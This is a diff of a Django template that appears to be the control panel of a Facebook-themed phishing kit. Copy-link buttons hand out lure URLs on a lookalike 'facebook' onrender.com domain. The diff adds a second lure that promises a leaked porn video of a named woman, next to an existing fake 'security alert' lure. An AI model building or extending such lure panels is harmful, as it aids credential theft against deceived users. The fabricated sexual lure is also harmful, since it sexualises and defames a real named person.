@@ -1,5 +1,6 @@
-{% load static %}
 {% extends 'base.html' %}
+{% load static %}
+
         {% block content %}
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
 
@@ -13,7 +14,9 @@ function copyToClipboard(elemento) {
 }
 
 </script>
-<div class="card" style="width: 18rem;">
+<div class="row">
+<div class="col">
+<div class="card text-center h-90%" style="width: 18rem;">
   <img src="{% static 'img/alert.png' %}" class="card-img-top" alt="...">
   <div class="card-body">
     <h5 class="card-title">Alerta de Seguridad</h5>
@@ -21,5 +24,23 @@ function copyToClipboard(elemento) {
     <p class="d-none" id="p1">https://facebook-vkk6.onrender.com/alerta/de/seguridad/</p>
     <a href="#" class="btn btn-primary"  onclick="copyToClipboard('#p1')">Copiar Enlace</a>
   </div>
-</div>       
+  </div>
+</div>
+
+<div class="col">
+<div class="card text-center" style="width: 18rem;">
+  <img src="https://img-cf.xvideos-cdn.com/videos/thumbs169l/d8/c5/72/d8c572dec1eec94eb0e992f8d7428b41-2/d8c572dec1eec94eb0e992f8d7428b41.5.jpg" class="card-img-top" alt="...">
+  <div class="card-body">
+    <h5 class="card-title">Video Porno Salma Flores</h5>
+    <p class="card-text">Este enlace envia un video filtrado de salma flores.</p>
+    <p class="d-none" id="p1">https://facebook-vkk6.onrender.com/nuevo/video/porno/salma/</p>
+    <a href="#" class="btn btn-primary"  onclick="copyToClipboard('#p1')">Copiar Enlace</a>
+  </div>
+  </div>
+</div>
+
+
+
+
+</div>
                   {% endblock %}
